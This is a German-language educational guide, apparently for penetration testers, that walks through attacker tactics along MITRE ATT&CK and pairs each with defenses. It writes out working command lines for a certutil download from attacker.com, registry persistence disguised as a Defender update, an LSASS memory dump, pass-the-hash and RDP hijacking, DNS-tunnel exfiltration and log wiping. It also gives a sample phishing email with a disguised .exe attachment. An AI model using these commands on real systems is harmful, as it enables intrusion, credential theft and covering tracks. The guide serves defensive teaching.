# The Attacker's Mindset: TTPs (Tactics, Techniques, and Procedures)

> "Um den Feind zu besiegen, musst du wie der Feind denken." - Sun Tzu

Dieses Dokument deckt die Denkweise, Taktiken und Techniken echter Angreifer ab.

---

## Die Psychologie eines Angreifers

### Motivations-Matrix

| Motivation | Ziele | Gefährlichkeit |
|------------|-------|----------------|
| **Finanziell** | Ransomware, Datenverkauf | SEHR HOCH |
| **Ideologisch** | Hacktivismus, politisch | HOCH |
| **Spionage** | Staatsgeheimnisse, IP | SEHR HOCH |
| **Zerstörung** | Chaos, Rache | HOCH |

### Das OPP Framework

Angreifer denken in 3 Phasen:
- **O**pportunity: Wo ist der einfachste Weg rein?
- **P**rofit: Was kann ich gewinnen?
- **P**rotection: Wie bleibe ich unentdeckt?

---

## MITRE ATT&CK in der Praxis

### Initial Access - Phishing

**Der Angreifer denkt:**
```
Ich brauche nicht die beste Technik,
ich brauche den schwächsten Menschen.
```

**Real-World Beispiel:**
```yaml
Ziel: CFO eines Mittelständlers
Recherche:
  - LinkedIn: Post über neue DSGVO-Richtlinien
  - Twitter: Beschwert sich über Steuerberater
  
Angriff:
  Subject: "Wichtig: Neue DSGVO-Richtlinien"
  From: dsgvo-update@bundesfinanzdienst.de
  Attachment: "DSGVO_Checkliste_2024.pdf.exe"
  
Erfolg: 40% Öffnungsrate bei 50 Mitarbeitern
```

**Defense:** SPF, DKIM, DMARC, User Training

---

### Execution - Living off the Land

```powershell
# PowerShell - In-Memory Execution
# Keine Datei auf Disk!
powershell -enc <base64_encoded_payload>

# LOLBAS - Legitimate tools for malicious purposes
rundll32.exe javascript:"..code.."
certutil -urlcache -split -f http://attacker.com/file.exe
mshta.exe javascript:alert("Hello")
```

**Defense:** PowerShell Constrained Language, Script Block Logging

---

### Persistence - Registry Run Keys

```cmd
# Unauffälliger Name
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \\
  /v "WindowsDefenderUpdate" /t REG_SZ \\
  /d "C:\Windows\malware.exe" /f
```

**Defense:** Autoruns (Sysinternals), Registry Monitoring

---

### Privilege Escalation

**Token Impersonation:**
```powershell
# JuicyPotato - Service Account to SYSTEM
JuicyPotato.exe -l 1337 -p cmd.exe -t *
```

**Defense:** Least Privilege, AppLocker, EDR

---

### Credential Access

**LSASS Memory Dump:**
```powershell
# Mit Windows-eigener DLL!
rundll32 C:\Windows\System32\comsvcs.dll, \\
  MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```

**Defense:** Credential Guard, LSA Protection

---

### Lateral Movement

**Pass-the-Hash:**
```bash
# Kein Passwort nötig - nur der Hash!
psexec.py -hashes <hash> administrator@10.0.0.10
```

**RDP Hijacking:**
```powershell
# Session stehlen ohne Passwort
tscon 2 /dest:rdp-tcp#0
```

**Defense:** Network Segmentation, PAM, Jump Hosts

---

### Exfiltration

**DNS Tunneling:**
```python
# Daten als Subdomains verschleiern
chunk = base64_data[i:i+60]
subdomain = f"{chunk}.data.attacker.com"
dns.resolve(subdomain, 'A')
```

**Defense:** DLP, DNS Logging, Network Monitoring

---

## Advanced Persistent Threats (APTs)

### Die 7 Phasen

1. **Initial Compromise** - Spear Phishing
2. **Establish Foothold** - Backdoor installation
3. **Escalate Privileges** - Exploit, Token theft
4. **Internal Recon** - AD Enumeration
5. **Lateral Movement** - Pass-the-Hash
6. **Maintain Presence** - Rootkits
7. **Complete Mission** - Data Exfiltration

### APT-Taktiken

**1. Dwell Time Maximization**
- Durchschnitt: 200+ Tage unentdeckt
- Langsamer Datenabfluss
- Legitime Tools nutzen

**2. Anti-Forensics**
```bash
# Nur eigene Spuren löschen
sed -i '/attacker_ip/d' /var/log/auth.log
touch -r /bin/bash /root/.bash_history
```

**3. False Flags**
- Chinesische APT nutzt russische Tools
- Attribution erschweren

---

## Defensive Countermeasures

### Defense in Depth

```
Perimeter (Firewall, WAF)
    |
Network (IDS/IPS, Segmentation)
    |
Endpoint (EDR, AV)
    |
Application (Input Validation)
    |
Data (Encryption, DLP)
    |
User (Training, MFA)
```

### Honeypots & Deception

```python
# Canary Token
def create_canary():
    token = uuid.uuid4()
    username = f"svc_backup_{token[:8]}"
    password = f"Backup2024_{token[-8:]}"
    
    # In Config-Files verteilen
    # Bei Verwendung -> ALARM!
    return {"username": username, "password": password}
```

---

## Fazit

### Key Takeaways

1. **Angreifer sind geduldig** - 200+ Tage Dwell Time
2. **Angreifer sind faul** - Nutzen vorhandene Tools
3. **Angreifer sind kreativ** - Neue Wege finden
4. **Angreifer sind geschäftsmäßig** - ROI wichtig

### Das Sword & Shield Prinzip

Um ein guter Pentester zu sein:
- Kenne die Angriffsvektoren (Sword)
- Verstehe die Abwehrmaßnahmen (Shield)
- Bewerte das Risiko
- Handle ethisch

> "Nur wer Schwert UND Schild besitzt, kann sich wirklich als Pentester beweisen."

---

*For educational purposes only. Always act ethically and legally.*
